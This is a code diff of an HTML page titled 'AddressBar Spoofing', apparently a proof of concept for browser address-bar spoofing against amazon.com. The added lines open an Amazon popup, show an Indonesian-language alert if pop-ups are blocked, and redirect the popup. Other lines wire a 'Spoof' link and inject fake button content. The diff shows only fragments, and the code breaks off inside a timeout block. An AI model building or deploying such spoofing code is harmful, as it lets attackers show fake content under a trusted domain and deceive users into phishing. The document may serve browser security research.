@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+    <title>AddressBar Spoofing</title>
 </head>
 <body>
         <a id="spoof-link" href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
@@ -19,6 +19,15 @@
                     <button action="#" method="post">Click me</button>
                 `;
             }
+
+            const popup = window.open("https://www.amazon.com/", "_blank");
+
+            if (!popup) {
+                alert("Pop-up diblokir. Izinkan pop-up lalu coba lagi.");
+                return;
+            }
+
+            popup.location.href = "https://www.amazon.com/";
 
             setTimeout(() => {
                 try {
